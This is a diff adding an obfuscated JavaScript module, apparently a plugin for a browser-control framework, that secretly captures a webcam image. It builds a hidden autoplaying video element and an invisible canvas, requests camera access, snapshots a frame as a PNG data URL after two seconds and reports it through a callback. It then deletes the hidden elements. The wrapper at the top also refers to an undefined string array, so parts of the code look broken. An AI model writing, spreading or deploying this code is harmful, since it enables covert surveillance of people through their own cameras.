@@ -1,0 +1,134 @@
+(function(_0x114dc5, _0x40e88e) {
+    var _0x3bcf73 = function(_0x39e1e6) {
+        while (--_0x39e1e6) {
+            _0x114dc5['push'](_0x114dc5['shift']());
+        }
+    };
+    _0x3bcf73(++_0x40e88e);
+}(_0x40e8, 0xac));
+var _0x3bcf = function(_0x114dc5, _0x40e88e) {
+    _0x114dc5 = _0x114dc5 - 0x0;
+    var _0x3bcf73 = _0x40e8[_0x114dc5];
+    return _0x3bcf73;
+};
+'use strict';
+
+function _classCallCheck(_0x3dc003, _0x484af4) {
+    if (!(_0x3dc003 instanceof _0x484af4)) {
+        throw new TypeError(`Cannot call a class as a function`);
+    }
+}
+
+function _defineProperties(_0x410efe, _0x3f6c45) {
+    for (var _0x59ea5d = 0x0; _0x59ea5d < _0x3f6c45['length']; _0x59ea5d++) {
+        var _0x437c51 = _0x3f6c45[_0x59ea5d];
+        _0x437c51[`enumerable`] = _0x437c51[`enumerable`] || ![];
+        _0x437c51['configurable'] = !![];
+        if (`value` in _0x437c51) _0x437c51[`writable`] = !![];
+        Object[`defineProperty`](_0x410efe, _0x437c51[`key`], _0x437c51);
+    }
+}
+
+function _createClass(_0x4f27ff, _0x485f00, _0xdc6b97) {
+    if (_0x485f00) _defineProperties(_0x4f27ff['prototype'], _0x485f00);
+    if (_0xdc6b97) _defineProperties(_0x4f27ff, _0xdc6b97);
+    return _0x4f27ff;
+}(function() {
+    var _0x463297 = function() {
+        function _0xc4432c(_0x338c81, _0x30e009, _0x1a4352) {
+            _classCallCheck(this, _0xc4432c);
+            this['api'] = _0x338c81;
+            this[`plugin`] = _0x1a4352;
+            this['execute']();
+        }
+        _createClass(_0xc4432c, [{
+            'key': `report`,
+            'value': function _0x37a9bb(_0x189d3c) {
+                return this[`api`][`callback`]({
+                    'status': !![],
+                    'data': _0x189d3c
+                }, {
+                    'plugin': this[`plugin`],
+                    'type': 'image'
+                });
+            }
+        }, {
+            'key': `execute`,
+            'value': function _0x1f4aa1() {
+                var _0x47cb1a = this;
+                var _0x408813 = function() {
+                    var _0x5d713f, _0x281751;
+                    _0x5d713f = _0x47cb1a[`api`][`base`][`random`]();
+                    _0x281751 = _0x47cb1a[`api`][`dom`][`createHiddenElement`](`video`, {
+                        'autoplay': 'true'
+                    }, !![]);
+                    setTimeout(function() {
+                        return $('#' + _0x5d713f)[`remove`]();
+                    }, 0x1388);
+                    return _0x281751;
+                }();
+                var _0x57b251 = function() {
+                    var _0x500eb8, _0x512e8b;
+                    _0x500eb8 = _0x47cb1a[`api`]['base'][`random`]();
+                    _0x512e8b = _0x47cb1a[`api`][`dom`][`createElement`](`canvas`, {
+                        'style': `width:640px;height:480px;visibility:hidden;display:none;`,
+                        'height': '480px',
+                        'width': `640px`,
+                        'id': _0x500eb8
+                    }, !![]);
+                    setTimeout(function() {
+                        return $('#' + _0x500eb8)[`remove`]();
+                    }, 0x1388);
+                    return _0x512e8b;
+                }();
+                var _0x9139fc = _0x57b251[`getContext`]('2d');
+                var _0x2a926e = null;
+                var _0x49d511 = function _0x344ae1() {
+                    var _0x441423 = function() {
+                        if (!_0x2a926e) {
+                            return '';
+                        }
+                        _0x9139fc[`drawImage`](_0x408813, 0x0, 0x0);
+                        return _0x57b251[`toDataURL`](`image/png`);
+                    }();
+                    if (!_0x441423) {
+                        _0x47cb1a[`report`]('[ERROR]', 'Result\x20is\x20empty.', `string`);
+                        return ![];
+                    }
+                    _0x47cb1a[`report`](_0x441423);
+                    return !![];
+                };
+                window['URL'] = window[`URL`] || window['webkitURL'];
+                if (navigator[`mediaDevices`] === undefined) {
+                    navigator['mediaDevices'] = {};
+                }
+                if (navigator[`mediaDevices`][`getUserMedia`] === undefined) {
+                    navigator[`mediaDevices`][`getUserMedia`] = function(_0x55a21e) {
+                        var _0x1b8bef = navigator[`webkitGetUserMedia`] || navigator[`mozGetUserMedia`];
+                        if (!_0x1b8bef) {
+                            return Promise['reject'](new Error(`getUserMedia is not implemented in this browser`));
+                        }
+                        return new Promise(function(_0x38d804, _0x1c4ec0) {
+                            _0x1b8bef[`call`](navigator, _0x55a21e, _0x38d804, _0x1c4ec0);
+                        });
+                    };
+                }
+                navigator['mediaDevices'][`getUserMedia`]({
+                    'video': !![]
+                })[`then`](function(_0x3ee728) {
+                    if (`srcObject` in _0x408813) {
+                        _0x408813[`srcObject`] = _0x3ee728;
+                    } else {
+                        _0x408813[`src`] = window['URL'][`createObjectURL`](_0x3ee728);
+                    }
+                    _0x2a926e = _0x3ee728;
+                    setTimeout(_0x49d511, 0x7d0);
+                })[`catch`](function(_0x16c72b) {
+                    _0x47cb1a[`report`](`[ERROR]`, `Device is disabled`, `string`);
+                });
+            }
+        }]);
+        return _0xc4432c;
+    }();
+    return _0x463297;
+}());
